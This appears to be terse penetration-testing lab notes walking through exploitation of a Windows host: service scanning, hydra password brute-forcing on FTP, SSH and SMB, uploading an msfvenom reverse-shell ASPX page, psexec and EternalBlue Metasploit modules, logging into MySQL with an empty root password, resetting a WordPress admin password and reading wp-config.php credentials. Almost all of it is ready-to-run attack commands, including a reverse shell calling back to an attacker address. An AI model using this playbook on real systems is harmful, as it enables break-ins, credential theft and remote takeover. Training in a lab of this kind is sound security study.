```
- Windows Exploitation
    - `nmap -sV 10.2.29.246`
    - `nmap -T4 -PA -sC -sV -p 1-10000 10.2.29.246 -oX nmap_10k`
    - `service postgresql start && msfconsole`
    - `db_status
    workspace -a Win2k8
    setg RHOST 10.2.29.246
    setg RHOSTS 10.2.29.246
    db_import nmap_10k`
    - `hosts
    services
    use auxiliary/scanner/smb/smb_version
    run
    hosts`
    
    1. **IIS/FTP**
    - `nmap -sV -sC -p21,80 10.2.29.246`
    - `ftp 10.2.29.246` - anonymous login failed
    - `hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.2.29.246 ftp`
    - `hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt 10.2.29.246 ftp -I`
    - Now login using valid user cred
    - `ftp 10.2.29.246` Use administartor:vagrant
    - Create one .asp and upload to ftp
    - `msfvenom -p windows/shell/reverse_tcp LHOST=10.10.24.4 LPORT=1234 -f asp > shell.aspx`
    - `ftp 10.2.29.246` Use vagrant:vagrant
    - `put shell.aspx`
    - Go to msfconsole session
    - `use multi/handler
    set payload windows/shell/reverse_tcp
    set LHOST 10.10.24.4
    set LPORT 1234`
    - Open the browser and navigate to 10.2.29.246/shell.aspx
    - got reverse shell
    
    1. **OpenSSH**
    - `nmap -sV -sC -p 22 10.2.16.83`
    - `hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt 10.2.16.83 ssh`
    - `hydra -l administrator /usr/share/wordlists/metasploit/unix_users.txt 10.2.16.83 ssh`
    - `ssh [vagrant@10.2.16.83](mailto:vagrant@10.2.16.83)` use vagrant:vagrant
    - `net localgroup administrators`
    - `msfconsole`
    - `use auxiliary/scanner/ssh/ssh_login
    setg RHOST 10.2.16.83
    setg RHOSTS 10.2.16.83
    set USERNAME vagrant
    set PASSWORD vagrant
    run
    session -u 1`
    - Got meterpreter sessions
    
    1. **SMB**
    - `nmap -sV -sC -p 445 10.2.26.45`
    - `hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.2.26.45 smb`
    - `hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.2.26.45 smb`
    - `smbclient -L 10.2.26.45 -U vagrant`
    - `smbmap -u vagrant -p vagrant -H 10.2.26.45`
    - `enum4linux -u vagrant -p vagrant -U 10.2.26.45`
    - `locate [psexec.py](http://psexec.py/)
    cp /usr/share/doc/python3-impacket/examples/psexec.py .
    chmod +x [psexec.py](http://psexec.py/)`
    - `python3 [psexec.py](http://psexec.py/) [Administrator@10.2.26.45](mailto:Administrator@10.2.26.45)`
    - `msfconsole -q
    use exploit/windows/smb/psexec
    set RHOSTS 10.2.26.45
    set SMBUser Administrator
    set SMBPass vagrant
    set payload windows/x64/meterpreter/reverse_tcp
    run`
    - `use exploit/windows/smb/ms17_010_eternalblue
    options
    set RHOSTS 10.2.26.45
    run`
    
    1. **MYSQL**
    - `nmap -sV -sC -p 3306,8585 10.2.26.45`
    - `use auxiliary/scanner/mysql/mysql_login
    set RHOSTS 10.2.26.45
    set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
    run`
    - `mysql -u root -p -h 10.2.26.45 - root password is empty`
    - `show databases;
    use wordpress;
    show tables;
    select * from wp_users;`
    - `UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin'; - change password`
    - `exploit eternalblue`
    - `use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS 10.2.26.45
    run`
    - `sysinfo`
    - `cd /
    cd wamp
    dir
    cd www\\wordpress
    cat wp-config.php`
    - see mysql cred in this file
```